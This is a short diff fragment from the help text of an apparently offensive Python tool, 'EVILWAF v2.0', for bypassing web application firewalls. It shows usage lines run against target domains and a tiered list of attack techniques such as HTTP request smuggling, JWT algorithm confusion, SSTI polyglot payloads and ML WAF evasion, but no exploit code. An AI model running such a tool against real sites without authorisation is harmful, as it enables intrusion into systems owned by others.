+  python3 evilwaf.py -d https://example.com -o results.json (Recommended)
+  python3 evilwaf.py -d https://target.com
+  python3 evilwaf.py -d target.com
   python3 evilwaf.py -d www.target.com
 
 {Colors.WHITE}Options:{Colors.END}
@@ -1679,19 +2289,29 @@ EVILWAF v2.0
 
 
 {Colors.WHITE}Techniques:{Colors.END}
-  • Subdomain Discovery
-  • DNS History Bypass  
-  • Header Manipulation
+  Critical risk: Direct Exploitation
   • HTTP Request Smuggling
-  • JWT Algorithm Confusion
-  • GraphQL Query Batching
-  • gRPC/Protobuf Bypass
-  • Advanced Protocol Attacks
+  •JWT Algorithm Confusion
+  •HTTP/2 Stream Multiplexing
+  •WebAssembly Memory Corruption
+  
+  High risk: Potential Exploitation
+  •SSTI Polyglot Payloads
+  •gRPC/Protobuf Bypass
+  •GraphQL Query Batching
+  °ML WAF Evasion
+  
+  Medium risk: Information Gathering 
+  ° Subdomain Discovery
+  ° DNS History Bypass  
+  ° Header Manipulation
+  ° Advanced Protocol Attacks
 
 
 {Colors.WHITE}Examples:{Colors.END}
+  python3 evilwaf.py -d target.com -o results.json (Recommended)
   python3 evilwaf.py -d example.com
-  python3 evilwaf.py -d https://website.com -o results.json
+  python3 evilwaf.py -d https://website.com -o results.json (Recommended)
   python3 evilwaf.py -d www.target.com
 {Colors.END}
 """
@@ -1731,3 +2351,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
